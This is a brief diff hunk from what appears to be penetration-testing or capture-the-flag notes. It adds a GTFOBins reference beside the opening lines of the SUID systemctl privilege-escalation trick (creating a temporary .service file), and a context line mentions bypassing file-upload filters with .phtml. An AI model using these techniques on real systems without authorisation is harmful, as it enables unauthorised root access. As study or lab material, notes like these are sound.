@@ -14,6 +14,7 @@ File upload vulnerabilities bypass with .phtml
 
 ```
 SUID systemctl
+https://gtfobins.github.io/gtfobins/systemctl/
 
 TF=$(mktemp).service
 echo '[Service]
